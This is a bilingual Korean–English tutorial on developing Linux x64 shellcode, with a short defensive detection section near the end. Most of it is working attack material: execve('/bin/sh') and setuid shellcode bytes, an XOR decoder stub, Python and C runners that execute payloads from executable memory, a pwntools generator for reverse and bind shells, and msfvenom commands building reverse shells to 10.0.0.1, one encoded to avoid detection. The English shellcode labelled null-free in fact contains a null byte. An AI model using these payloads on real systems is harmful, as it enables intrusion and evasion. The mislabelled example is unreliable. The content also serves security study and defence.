> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 셸코드 개발

## 0. 초보자를 위한 개념 이해

### 셸코드란?

**셸코드(Shellcode)**는 취약점을 통해 대상 프로세스에 주입되어 실행되는 기계어 코드입니다. 이름처럼 쉘(`/bin/sh`)을 실행하는 것이 주요 목적이지만 어떤 코드도 될 수 있습니다.

**왜 배우는가:**
```
버퍼 오버플로 공격의 흐름:

취약한 프로그램                  공격자
gets(buffer) ──────────────▶ AAAA...AAAA + 셸코드 주소
     ↑                              ↑
스택에 셸코드 저장          리턴 주소를 셸코드로 덮어씀
     ↓
프로그램이 리턴 시 셸코드 실행 → 쉘 획득
```

### 핵심 개념 정리

```
셸코드 특징:
  1. NULL 바이트 없음: 문자열 함수(strcpy 등)가 NULL에서 중단
  2. 위치 독립적(PIC): 어느 주소에 로드되든 실행 가능
  3. 최소 크기: 메모리 제약 환경 고려

Linux x64 execve("/bin/sh") 셸코드 원리:
  rax = 59 (sys_execve 번호)
  rdi = "/bin/sh" 주소
  rsi = NULL (argv)
  rdx = NULL (envp)
  syscall → 쉘 실행

보호 기법:
  NX/DEP: 스택 실행 불가 → 셸코드 직접 주입 차단
  ASLR: 주소 랜덤화 → 셸코드 위치 예측 불가
  → 이를 우회하는 기법이 ROP (다음 문서)
```

### 필요한 도구
- **pwntools**: 셸코드 생성·익스플로잇 Python 라이브러리
- **nasm**: 어셈블리 → 기계어 컴파일
- **msfvenom**: Metasploit 셸코드 생성기

### 기초 실습 예제
```python
from pwn import *

# pwntools로 셸코드 생성
context.arch = 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())  # /bin/sh 실행 셸코드
print(f"셸코드 크기: {len(shellcode)} bytes")
print(f"헥스: {shellcode.hex()}")

# 셸코드에 NULL 바이트 있는지 확인 (중요!)
if b'\x00' in shellcode:
    print("⚠ NULL 바이트 존재 → 스트링 취약점에 사용 불가")
else:
    print("✓ NULL 바이트 없음 → 안전")
```

---

## 1. 셸코드란

셸코드(Shellcode)는 취약점을 악용해 대상 프로세스 내에서 직접 실행되도록 설계된 기계어 코드다. 일반적으로 쉘(`/bin/sh`)을 실행하는 것이 목적이지만 넓은 의미로는 임의의 페이로드 코드를 의미한다.

### 셸코드의 특성

- **위치 독립적(Position Independent Code, PIC)**: 어느 주소에 올라가도 동작
- **자기 완결적**: 외부 라이브러리나 로더 없이 동작
- **크기 최소화**: 버퍼 제약으로 인해 최대한 작게 작성
- **Bad byte 없음**: 특정 바이트(예: 0x00, 0x0a, 0x0d)가 처리 중 잘림 방지

---

## 2. 셸코드 작성 단계

```
1. 목표 동작 결정 (execve("/bin/sh"), reverse shell 등)
         ↓
2. NASM으로 어셈블리 작성
         ↓
3. 컴파일 → 오브젝트 파일 생성
         ↓
4. objdump로 기계어 바이트 추출
         ↓
5. Bad byte 확인 및 제거
         ↓
6. C 또는 Python으로 테스트 실행
         ↓
7. 실제 익스플로잇에 삽입
```

---

## 3. 64비트 execve("/bin/sh") 셸코드

### 3.1 기본 버전

NASM(Netwide Assembler) 어셈블리 코드입니다. x86/x64 셸코드 개발이나 저수준 프로그래밍에 사용하는 어셈블러 문법입니다.

```nasm
; execve_shell.asm
; execve("/bin/sh", ["/bin/sh", NULL], NULL)
; syscall 번호: execve = 59 (0x3b)
; 빌드: nasm -f elf64 execve_shell.asm -o execve_shell.o
;       ld execve_shell.o -o execve_shell

section .text
    global _start

_start:
    ; RDI = "/bin/sh\0" 주소 (스택에 구성)
    xor  rdx, rdx           ; rdx = NULL (envp)
    
    ; "/bin/sh" 문자열을 스택에 push
    ; "/bin/sh\0" = 0x0068732f6e69622f (리틀엔디안 + null padding)
    push rdx                ; null terminator (0)
    mov  rbx, 0x68732f6e69622f2f  ; "//bin/sh" (8바이트, null 없음)
    push rbx
    mov  rdi, rsp           ; rdi = "/bin/sh" 스택 주소

    ; argv = [rdi, NULL] 스택에 구성
    push rdx                ; NULL (argv 종료)
    push rdi                ; argv[0] = "/bin/sh"
    mov  rsi, rsp           ; rsi = argv 배열 주소

    ; execve 시스템 콜
    mov  al, 59             ; syscall 번호 (상위 바이트 0으로 유지)
    syscall
```

```bash
# 컴파일 및 기계어 추출
nasm -f elf64 execve_shell.asm -o execve_shell.o
ld execve_shell.o -o execve_shell
objdump -d -M intel execve_shell.o
```

### 3.2 objdump 출력 예시 및 바이트 추출

```bash
objdump -d -M intel execve_shell.o

# 출력 예시:
# 0000000000000000 <_start>:
#    0: 48 31 d2              xor    rdx,rdx
#    3: 52                    push   rdx
#    4: 48 bb 2f 2f 62 69 6e  movabs rbx,0x68732f6e69622f2f
#    b: 2f 73 68
#    e: 53                    push   rbx
#    f: 48 89 e7              mov    rdi,rsp
#   12: 52                    push   rdx
#   13: 57                    push   rdi
#   14: 48 89 e6              mov    rsi,rsp
#   17: b0 3b                 mov    al,0x3b
#   19: 0f 05                 syscall

# 바이트 시퀀스 추출 (한 줄로)
objdump -d execve_shell.o | grep '^\s' | \
  awk '{for(i=2;i<=NF;i++) if(length($i)==2 && $i~/^[0-9a-f]+$/) printf "\\x"$i; else break}' && echo
```

### 3.3 더 짧은 버전 (자기참조 방식)


NASM으로 작성한 셸코드 소스입니다. `section .text`에 실행 코드를 배치하고, `global _start`로 진입점을 선언합니다. 컴파일 후 `objdump -d`로 생성된 기계어 바이트를 추출하여 익스플로잇에 삽입합니다.

```nasm
; execve_short.asm — RIP-relative 주소 활용
; 28바이트 버전

section .text
    global _start

_start:
    jmp  .get_addr

.shellcode:
    pop  rdi                ; rdi = "/bin/sh\0" 주소 (call이 push한 주소)
    xor  rdx, rdx
    push rdx
    push rdi
    mov  rsi, rsp
    mov  al,  59
    syscall

.get_addr:
    call .shellcode
    db "/bin/sh", 0         ; 문자열 데이터 (call이 이 주소를 push)
```

---

## 4. Bad Byte 제거 기법

### 4.1 흔한 Bad Byte 목록

| 바이트 | 이유 |
|--------|------|
| `0x00` | C 문자열 종료(null terminator) — strcpy, gets 등에서 잘림 |
| `0x0a` | newline — fgets 등에서 입력 종료 |
| `0x0d` | carriage return — 일부 파서에서 종료 |
| `0x20` | 공백 — scanf 등에서 분리 기준 |
| `0xff` | 일부 환경에서 인코딩 문제 |

### 4.2 0x00 제거 기법

NASM(Netwide Assembler) 어셈블리 코드입니다. x86/x64 셸코드 개발이나 저수준 프로그래밍에 사용하는 어셈블러 문법입니다.

```nasm
; 문제: mov rax, 59 → 48 c7 c0 3b 00 00 00 (0x00 포함)
; 해결 1: xor 후 AL 사용
xor rax, rax
mov al, 59          ; b0 3b (0x00 없음)

; 해결 2: 보수 값 XOR
mov rax, ~59        ; 비트 반전값 로드
xor rax, ~0         ; 다시 반전 → 59

; 문제: push 0 (null terminator) → 6a 00
; 해결: xor 후 push
xor rdx, rdx
push rdx            ; 52 (0x00 없음)

; 문제: "/bin/sh\0" 마지막 null
; 해결: 스택에서 레지스터 통해 null 강제 삽입
xor  rbx, rbx       ; rbx = 0
push rbx            ; push null
mov  rbx, 0x68732f6e69622f2f  ; "//bin/sh"
push rbx
```

### 4.3 인코더/디코더 패턴

NASM(Netwide Assembler) 어셈블리 코드입니다. x86/x64 셸코드 개발이나 저수준 프로그래밍에 사용하는 어셈블러 문법입니다.

```nasm
; XOR 인코딩된 셸코드 실행 패턴
; 실제 셸코드 앞에 디코더 스텁을 붙임

decoder_stub:
    jmp  .get_shellcode_addr

.decode:
    pop  rsi                ; 인코딩된 셸코드 주소
    xor  rcx, rcx
    mov  cl, shellcode_len  ; 셸코드 길이

.loop:
    xor  BYTE PTR [rsi + rcx - 1], 0x41  ; XOR 키 0x41로 디코딩
    loop .loop
    jmp  rsi                ; 디코딩된 셸코드 실행

.get_shellcode_addr:
    call .decode
    ; 인코딩된 셸코드 바이트들...
    encoded_shellcode: db 0x..., ...
    shellcode_len equ $ - encoded_shellcode
```

---

## 5. 셸코드 테스트 Python 스크립트


셸코드를 테스트 환경에서 실행하는 코드입니다. Python의 `ctypes`나 C로 메모리를 할당하고 셸코드를 복사 후 실행하여 동작을 검증합니다. 실제 익스플로잇 전 격리된 환경에서 반드시 테스트해야 합니다.

```python
#!/usr/bin/env python3
"""
shellcode_runner.py — ctypes를 이용한 셸코드 실행 테스터

사용법:
    python shellcode_runner.py -f shellcode.bin
    python shellcode_runner.py -x "\\x48\\x31\\xd2\\x52..."
    python shellcode_runner.py --hex "4831d25248bb..."
"""

import argparse
import ctypes
import ctypes.util
import mmap
import os
import sys
from pathlib import Path


def load_libc() -> ctypes.CDLL:
    """플랫폼별 libc 로드."""
    libc_name = ctypes.util.find_library("c")
    if not libc_name:
        raise RuntimeError("libc를 찾을 수 없습니다.")
    return ctypes.CDLL(libc_name, use_errno=True)


def alloc_exec_mem(size: int) -> mmap.mmap:
    """실행 가능한 메모리 영역 할당 (mmap 사용)."""
    mm = mmap.mmap(
        -1,
        size,
        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
        flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
    )
    return mm


def run_shellcode(shellcode: bytes) -> None:
    """
    셸코드를 실행 가능한 메모리에 복사하고 함수 포인터로 실행.

    Args:
        shellcode: 실행할 셸코드 바이트열
    """
    size = len(shellcode)
    if size == 0:
        raise ValueError("셸코드가 비어 있습니다.")

    print(f"[*] 셸코드 크기: {size} bytes")
    print(f"[*] 셸코드 헥스: {shellcode.hex()}")

    # 실행 가능 메모리 할당
    mm = alloc_exec_mem(size)

    try:
        # 셸코드 복사
        mm.write(shellcode)
        mm.seek(0)

        # 메모리 주소 획득
        buf_addr = ctypes.addressof(
            ctypes.c_char.from_buffer(mm)
        )
        print(f"[*] 메모리 주소: {hex(buf_addr)}")

        # 함수 포인터로 캐스팅 후 호출
        func_type = ctypes.CFUNCTYPE(ctypes.c_void_p)
        func = func_type(buf_addr)

        print("[*] 셸코드 실행 중...")
        func()

    finally:
        mm.close()


def parse_hex_string(hex_str: str) -> bytes:
    """
    다양한 형식의 헥스 문자열을 바이트로 변환.

    지원 형식:
        "\\x48\\x31\\xd2" 또는 "4831d2" 또는 "48 31 d2"
    """
    cleaned = (
        hex_str
        .replace("\\x", "")
        .replace("0x", "")
        .replace(" ", "")
        .replace("\n", "")
    )
    try:
        return bytes.fromhex(cleaned)
    except ValueError as e:
        raise ValueError(f"잘못된 헥스 문자열: {e}") from e


def check_bad_bytes(shellcode: bytes, bad: list[int]) -> None:
    """
    셸코드에 bad byte가 포함되어 있는지 확인.

    Args:
        shellcode: 검사할 셸코드
        bad: bad byte 목록 (예: [0x00, 0x0a, 0x0d])
    """
    found: list[tuple[int, int]] = []
    for offset, byte_val in enumerate(shellcode):
        if byte_val in bad:
            found.append((offset, byte_val))

    if found:
        print("[!] Bad byte 발견:")
        for offset, byte_val in found:
            print(f"    오프셋 {offset:#x}: {byte_val:#04x}")
    else:
        print("[+] Bad byte 없음")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="셸코드 실행 테스터 (Linux x64 전용)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s -f shellcode.bin
  %(prog)s -x "\\x48\\x31\\xd2\\x52"
  %(prog)s --hex "4831d252"
  %(prog)s -f shellcode.bin --check-bad 00 0a 0d --no-exec
        """,
    )
    src = parser.add_mutually_exclusive_group(required=True)
    src.add_argument(
        "-f", "--file",
        type=Path,
        metavar="FILE",
        help="바이너리 셸코드 파일",
    )
    src.add_argument(
        "-x", "--escape",
        metavar="ESCAPED",
        help='이스케이프 형식 셸코드 (예: "\\\\x48\\\\x31...")',
    )
    src.add_argument(
        "--hex",
        metavar="HEX",
        help="헥스 문자열 셸코드 (예: 4831d2...)",
    )
    parser.add_argument(
        "--check-bad",
        nargs="+",
        metavar="BYTE",
        default=["00", "0a", "0d"],
        help="검사할 bad byte 목록 (기본: 00 0a 0d)",
    )
    parser.add_argument(
        "--no-exec",
        action="store_true",
        help="실행 없이 검사만 수행",
    )
    return parser


def main() -> int:
    if sys.platform != "linux":
        print("[-] 이 스크립트는 Linux 전용입니다.")
        return 1

    if os.geteuid() == 0:
        print("[!] root로 실행 중 — 주의 필요")

    parser = build_parser()
    args = parser.parse_args()

    # 셸코드 로드
    try:
        match (args.file, args.escape, args.hex):
            case (Path() as p, None, None):
                shellcode = p.read_bytes()
            case (None, str() as s, None):
                shellcode = parse_hex_string(s)
            case (None, None, str() as h):
                shellcode = parse_hex_string(h)
            case _:
                parser.error("입력 소스를 정확히 하나 지정하세요.")
                return 1
    except (FileNotFoundError, ValueError) as e:
        print(f"[-] 셸코드 로드 실패: {e}")
        return 1

    # Bad byte 검사
    try:
        bad_list = [int(b, 16) for b in args.check_bad]
    except ValueError as e:
        print(f"[-] bad byte 파싱 오류: {e}")
        return 1

    check_bad_bytes(shellcode, bad_list)

    if args.no_exec:
        print("[*] --no-exec 플래그로 실행 건너뜀")
        return 0

    # 실행
    try:
        run_shellcode(shellcode)
    except (RuntimeError, ValueError, OSError) as e:
        print(f"[-] 실행 실패: {e}")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
```

---

## 6. pwntools로 셸코드 생성/검증

### 6.1 기본 사용법

```python
from pwn import *

# 아키텍처 설정
context.arch = "amd64"   # x86_64 Linux
context.os   = "linux"
context.bits = 64

# 미리 구현된 셸코드 생성
sc = shellcraft.sh()           # /bin/sh 실행
print(sc)                      # 어셈블리 출력
payload = asm(sc)              # 기계어로 컴파일
print(f"길이: {len(payload)}")
print(enhex(payload))          # 헥스로 출력

# 커스텀 어셈블
custom_sc = asm("""
    xor rdi, rdi
    mov rax, 60
    syscall
""")
```

### 6.2 셸코드 검증 스크립트


셸코드를 테스트 환경에서 실행하는 코드입니다. Python의 `ctypes`나 C로 메모리를 할당하고 셸코드를 복사 후 실행하여 동작을 검증합니다. 실제 익스플로잇 전 격리된 환경에서 반드시 테스트해야 합니다.

```python
#!/usr/bin/env python3
"""
pwn_shellcode_verify.py — pwntools 기반 셸코드 생성 및 검증

사용법:
    python pwn_shellcode_verify.py --type sh
    python pwn_shellcode_verify.py --type connect --host 127.0.0.1 --port 4444
    python pwn_shellcode_verify.py --asm-file custom.asm --check-bad 00 0a
"""

import argparse
import sys
from typing import Literal


def setup_context(arch: str, bits: int, os_name: str) -> None:
    """pwntools context 설정."""
    from pwn import context
    context.arch = arch
    context.bits = bits
    context.os   = os_name
    context.log_level = "info"


def generate_shellcode(
    sc_type: Literal["sh", "connect", "bind"],
    host: str | None = None,
    port: int | None = None,
) -> bytes:
    """
    shellcraft로 셸코드 생성.

    Args:
        sc_type: 셸코드 종류
        host: 리버스 쉘 호스트
        port: 리버스/바인드 쉘 포트

    Returns:
        컴파일된 셸코드 바이트열
    """
    from pwn import asm, shellcraft

    match sc_type:
        case "sh":
            asm_code = shellcraft.sh()
        case "connect":
            if not host or not port:
                raise ValueError("--type connect 사용 시 --host, --port 필수")
            asm_code = shellcraft.connect(host, port) + shellcraft.sh()
        case "bind":
            if not port:
                raise ValueError("--type bind 사용 시 --port 필수")
            asm_code = shellcraft.bindsh(port)
        case _:
            raise ValueError(f"지원하지 않는 타입: {sc_type}")

    return asm(asm_code)


def verify_shellcode(shellcode: bytes, bad_bytes: list[int]) -> dict[str, object]:
    """
    셸코드 품질 검사.

    Returns:
        검사 결과 딕셔너리
    """
    result: dict[str, object] = {
        "size": len(shellcode),
        "hex": shellcode.hex(),
        "bad_bytes_found": [],
        "printable_ratio": 0.0,
    }

    bad_found: list[dict[str, int]] = []
    for offset, b in enumerate(shellcode):
        if b in bad_bytes:
            bad_found.append({"offset": offset, "byte": b})

    result["bad_bytes_found"] = bad_found

    printable = sum(1 for b in shellcode if 0x20 <= b < 0x7f)
    result["printable_ratio"] = printable / len(shellcode) if shellcode else 0.0

    return result


def disasm_shellcode(shellcode: bytes) -> str:
    """셸코드를 디스어셈블하여 문자열로 반환."""
    from pwn import disasm
    return disasm(shellcode)


def load_asm_file(path: str) -> bytes:
    """어셈블리 파일을 읽어 컴파일."""
    from pwn import asm
    from pathlib import Path
    asm_code = Path(path).read_text(encoding="utf-8")
    return asm(asm_code)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="pwntools 셸코드 생성 및 검증 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s --type sh
  %(prog)s --type connect --host 10.0.0.1 --port 4444
  %(prog)s --type bind --port 9999
  %(prog)s --asm-file custom.asm --arch i386 --bits 32
        """,
    )
    parser.add_argument(
        "--type",
        choices=["sh", "connect", "bind"],
        default="sh",
        help="셸코드 종류 (기본: sh)",
    )
    parser.add_argument("--host", help="리버스 쉘 대상 호스트")
    parser.add_argument("--port", type=int, help="포트 번호")
    parser.add_argument("--asm-file", metavar="FILE", help="커스텀 어셈블리 파일")
    parser.add_argument("--arch", default="amd64", help="아키텍처 (기본: amd64)")
    parser.add_argument("--bits", type=int, default=64, help="비트폭 (기본: 64)")
    parser.add_argument("--os", default="linux", dest="os_name", help="OS (기본: linux)")
    parser.add_argument(
        "--check-bad",
        nargs="+",
        metavar="BYTE",
        default=["00", "0a", "0d"],
        help="bad byte 검사 목록",
    )
    parser.add_argument("--output", "-o", metavar="FILE", help="셸코드를 파일로 저장")
    parser.add_argument("--disasm", action="store_true", help="디스어셈블 출력")
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    try:
        setup_context(args.arch, args.bits, args.os_name)
    except Exception as e:
        print(f"[-] context 설정 실패: {e}")
        return 1

    try:
        if args.asm_file:
            shellcode = load_asm_file(args.asm_file)
        else:
            shellcode = generate_shellcode(args.type, args.host, args.port)
    except (ValueError, FileNotFoundError) as e:
        print(f"[-] 셸코드 생성 실패: {e}")
        return 1

    # bad byte 파싱
    try:
        bad_list = [int(b, 16) for b in args.check_bad]
    except ValueError as e:
        print(f"[-] bad byte 파싱 오류: {e}")
        return 1

    # 검증
    result = verify_shellcode(shellcode, bad_list)

    print(f"[+] 셸코드 크기: {result['size']} bytes")
    print(f"[+] 헥스:\n{result['hex']}")

    bad_found: list[dict[str, int]] = result["bad_bytes_found"]  # type: ignore[assignment]
    if bad_found:
        print(f"[!] Bad byte {len(bad_found)}개 발견:")
        for item in bad_found:
            print(f"    오프셋 {item['offset']:#x}: {item['byte']:#04x}")
    else:
        print("[+] Bad byte 없음")

    print(f"[*] 출력 가능 문자 비율: {result['printable_ratio']:.1%}")

    if args.disasm:
        print("\n[*] 디스어셈블:\n")
        print(disasm_shellcode(shellcode))

    if args.output:
        from pathlib import Path
        Path(args.output).write_bytes(shellcode)
        print(f"[+] 저장: {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
```

---

## 7. C에 셸코드 삽입 및 테스트


셸코드를 테스트 환경에서 실행하는 코드입니다. Python의 `ctypes`나 C로 메모리를 할당하고 셸코드를 복사 후 실행하여 동작을 검증합니다. 실제 익스플로잇 전 격리된 환경에서 반드시 테스트해야 합니다.

```c
/* shellcode_test.c — 셸코드 실행 테스트 (교육 목적) */
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

/* execve("/bin/sh") 셸코드 (64bit Linux) */
unsigned char shellcode[] = {
    0x48, 0x31, 0xd2,                          /* xor    rdx, rdx          */
    0x52,                                       /* push   rdx               */
    0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e,  /* movabs rbx, "//bin/sh"  */
    0x2f, 0x73, 0x68,
    0x53,                                       /* push   rbx               */
    0x48, 0x89, 0xe7,                           /* mov    rdi, rsp          */
    0x52,                                       /* push   rdx               */
    0x57,                                       /* push   rdi               */
    0x48, 0x89, 0xe6,                           /* mov    rsi, rsp          */
    0xb0, 0x3b,                                 /* mov    al, 0x3b          */
    0x0f, 0x05                                  /* syscall                  */
};

int main(void) {
    printf("[*] 셸코드 길이: %zu bytes\n", sizeof(shellcode));

    /* 실행 가능한 메모리 할당 */
    void *exec_mem = mmap(
        NULL, sizeof(shellcode),
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
    );

    if (exec_mem == MAP_FAILED) {
        perror("mmap 실패");
        return 1;
    }

    memcpy(exec_mem, shellcode, sizeof(shellcode));

    printf("[*] 실행 주소: %p\n", exec_mem);
    printf("[*] 셸코드 실행...\n");

    /* 함수 포인터로 실행 */
    ((void(*)())exec_mem)();

    return 0;
}
```

```bash
# 컴파일 (스택 보호 해제)
gcc -z execstack -fno-stack-protector -no-pie shellcode_test.c -o shellcode_test
./shellcode_test
```

---

## 8. 셸코드 크기 최적화 팁

NASM(Netwide Assembler) 어셈블리 코드입니다. x86/x64 셸코드 개발이나 저수준 프로그래밍에 사용하는 어셈블러 문법입니다.

```nasm
; 크기를 줄이는 어셈블리 트릭

; 1. MOV 대신 PUSH/POP
; mov rax, 1 → 7바이트
; xor eax,eax / inc eax → 3바이트
xor eax, eax
inc eax

; 2. 32bit 레지스터 사용 (상위 32bit 자동 0)
; xor rax, rax → 3바이트 (REX prefix 포함)
; xor eax, eax → 2바이트
xor eax, eax

; 3. CDQ/CQO로 RDX 초기화
; xor rdx, rdx → 3바이트
; (RAX가 0이면) cdq → 1바이트
cdq

; 4. 즉시값 축소
; mov rax, 59 → 7바이트
; mov al, 59  → 2바이트 (RAX가 이미 0이면 유효)
xor eax, eax
mov al, 59

; 5. syscall 번호를 레지스터 조합으로
; write=1, read=0, execve=59=0x3b
; 0x3b = 0x3c(60) - 1 = 'exit' - 1
xor eax, eax
mov al, 0x3c
dec al          ; al = 0x3b (execve)
```

---

## 9. 실전 셸코드 목록

### 9.1 /bin/sh 실행 (27 바이트)


셸코드를 테스트 환경에서 실행하는 코드입니다. Python의 `ctypes`나 C로 메모리를 할당하고 셸코드를 복사 후 실행하여 동작을 검증합니다. 실제 익스플로잇 전 격리된 환경에서 반드시 테스트해야 합니다.

```python
shellcode = (
    b"\x48\x31\xd2"           # xor rdx, rdx
    b"\x52"                    # push rdx
    b"\x48\xbb\x2f\x2f\x62"
    b"\x69\x6e\x2f\x73\x68"   # movabs rbx, "//bin/sh"
    b"\x53"                    # push rbx
    b"\x48\x89\xe7"            # mov rdi, rsp
    b"\x52"                    # push rdx
    b"\x57"                    # push rdi
    b"\x48\x89\xe6"            # mov rsi, rsp
    b"\xb0\x3b"                # mov al, 0x3b
    b"\x0f\x05"                # syscall
)
```

### 9.2 setuid(0) + /bin/sh


셸코드를 테스트 환경에서 실행하는 코드입니다. Python의 `ctypes`나 C로 메모리를 할당하고 셸코드를 복사 후 실행하여 동작을 검증합니다. 실제 익스플로잇 전 격리된 환경에서 반드시 테스트해야 합니다.

```python
shellcode = (
    b"\x48\x31\xff"            # xor rdi, rdi
    b"\x6a\x69"                # push 0x69 (setuid syscall)
    b"\x58"                    # pop rax
    b"\x0f\x05"                # syscall (setuid(0))
    # ... 이후 execve 셸코드 이어붙이기
)
```

---

<!-- detect-validate-19 -->
## 셸코드 탐지와 방어 검증

셸코드 공격은 *실행 가능 메모리·시그니처 회피·아웃바운드 연결*을 노린다. 방어자는 **W^X·이그레스 필터가 실제로 막는가**와 **RWX 매핑·execve/mprotect 행위가 탐지되는가**를 검증해야 한다. 실습은 **소유 호스트**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| execve("/bin/sh") 셸코드 | 실행 가능 메모리 | W^X·NX | RWX 매핑·execve syscall 패턴 |
| Bad-byte 인코더/디코더 | 시그니처 회피 | 행위 기반 탐지 | 자기수정·디코더 스텁 |
| 스테이저/소켓 셸코드 | 아웃바운드 미차단 | 이그레스 필터 | 비정상 connect→execve 시퀀스 |
| C 삽입 RWX 테스트 | mprotect RWX | 페이지 권한 감시 | mprotect(...,PROT_EXEC) 호출 |

### 방어 검증 (직접 확인)

```bash
# 1) 프로세스에 RWX 메모리 매핑이 있는지 — 셸코드/JIT 스프레이 신호(소유 호스트)
grep -E 'rwxp' /proc/<PID>/maps && echo "RWX 매핑 — W^X 위반, 셸코드 표면"
# 2) execve/mprotect 호출을 추적해 셸코드 실행 행위 관찰
strace -f -e trace=execve,mprotect ./target 2>&1 | grep -E "execve|PROT_EXEC"
#   PROT_EXEC 로 권한 변경 후 점프하면 전형적 셸코드 실행 패턴
```

> 셸코드 방어는 *실행 가능 메모리가 통제되는가*에 달려 있다 — "NX 쓴다"와 "RWX 매핑·execve 행위가 탐지·차단된다"는 다르다. 소유 호스트에서 /proc maps 와 strace 로 직접 관찰한다([[06_Malware_Analysis]], [[09_Exploit_Techniques]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# Shellcode Development

## 1. What is Shellcode

Shellcode is machine code designed to execute directly within a target process by exploiting a vulnerability. While the typical goal is to execute a shell (`/bin/sh`), in the broader sense it refers to any arbitrary payload code.

---

## 2. Linux x86-64 Shellcode Basics

### execve("/bin/sh") Shellcode

```nasm
; Linux x86-64 execve("/bin/sh", NULL, NULL) shellcode
BITS 64

section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    ; syscall number 59 (0x3b)
    
    xor rdx, rdx          ; rdx = NULL (envp)
    xor rsi, rsi          ; rsi = NULL (argv)
    
    ; Push "/bin/sh" string
    mov rax, 0x68732f6e69622f2f  ; "//bin/sh"
    push rax
    mov rdi, rsp          ; rdi = pointer to "/bin/sh"
    
    push 59               ; syscall number for execve
    pop rax
    syscall               ; execute execve
```

```python
# Test shellcode with pwntools
from pwn import *

shellcode = asm(shellcraft.amd64.linux.sh())
print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Shellcode hex: {shellcode.hex()}")

# Check for null bytes
if b'\x00' in shellcode:
    print("[!] WARNING: Shellcode contains null bytes")
```

---

## 3. Null-Free Shellcode Techniques

```nasm
; Technique: XOR to avoid null bytes
; Instead of:  mov rax, 0
; Use:         xor rax, rax

; Instead of mov rdi, 0x68732f6e69622f2f (may have nulls)
; Build string on stack:

; "/bin/sh" = 0x68732f6e69622f2f
; No null bytes in this value, but verify:
python3 -c "print(b'/bin/sh\x00'.hex())"
; Result: 2f62696e2f736800  ← has 0x00!

; Solution: Use "//bin/sh" (8 chars, no null)
; 0x68732f6e69622f2f = "//bin/sh" reversed = no null
```

---

## 4. Shellcode Encoders

```bash
# MSFvenom shellcode generation
# Basic Linux x86-64 shell
msfvenom -p linux/x64/exec CMD=/bin/sh \
  -f python -b '\x00'

# Bind shell (listen on port)
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 \
  -f elf > bind_shell.elf

# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -f elf > reverse_shell.elf

# Windows shellcode
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -f python -b '\x00\x0a\x0d'

# Encode to avoid detection
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor -i 5 \
  -f elf > encoded_shell.elf
```

---

## 5. Custom Shellcode Testing

```python
#!/usr/bin/env python3
"""Shellcode testing harness"""
import ctypes
import mmap

def execute_shellcode(shellcode: bytes) -> None:
    """Execute shellcode in memory (Linux)"""
    
    # Allocate RWX memory
    size = len(shellcode)
    mem = mmap.mmap(-1, size, 
                    prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                    flags=mmap.MAP_ANON | mmap.MAP_PRIVATE)
    
    # Write shellcode
    mem.write(shellcode)
    mem.seek(0)
    
    # Execute
    ctypes.cast(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mem))),
                ctypes.CFUNCTYPE(None))()

# Linux x86-64 execve("/bin/sh") shellcode (null-free)
shellcode = bytes([
    0x48, 0x31, 0xff,  # xor rdi, rdi
    0x48, 0x31, 0xf6,  # xor rsi, rsi
    0x48, 0x31, 0xd2,  # xor rdx, rdx
    0x48, 0x31, 0xc0,  # xor rax, rax
    0x50,              # push rax
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,  # movabs rbx, "/bin/"
    0x73, 0x68, 0x00,  # "sh\x00"
    0x53,              # push rbx
    0x48, 0x89, 0xe7,  # mov rdi, rsp
    0xb0, 0x3b,        # mov al, 0x3b (execve syscall)
    0x0f, 0x05         # syscall
])

print(f"Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")

# Verify no null bytes
if b'\x00' not in shellcode:
    print("[+] No null bytes")
else:
    print("[!] Contains null bytes - may be truncated by strcpy!")
```

---

## 6. setuid + execve Shellcode

```python
shellcode = (
    b"\x48\x31\xff"            # xor rdi, rdi
    b"\x6a\x69"                # push 0x69 (setuid syscall)
    b"\x58"                    # pop rax
    b"\x0f\x05"                # syscall (setuid(0))
    # ... append execve shellcode after this
)
```

<!-- detect-validate-19 -->
## Shellcode Detection and Defense Validation

Shellcode attacks target *executable memory, signature evasion, and outbound connections*. Defenders must verify **whether W^X and egress filters actually block** and **whether RWX mappings and execve/mprotect behavior are detected**. Practice only on **owned hosts**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| execve("/bin/sh") shellcode | Executable memory | W^X / NX | RWX mapping / execve syscall pattern |
| Bad-byte encoder/decoder | Signature evasion | Behavior-based detection | Self-modifying / decoder stub |
| Stager/socket shellcode | Unblocked outbound | Egress filter | Abnormal connect->execve sequence |
| C-embedded RWX test | mprotect RWX | Page-permission monitoring | mprotect(...,PROT_EXEC) call |

### Defense validation (verify directly)

```bash
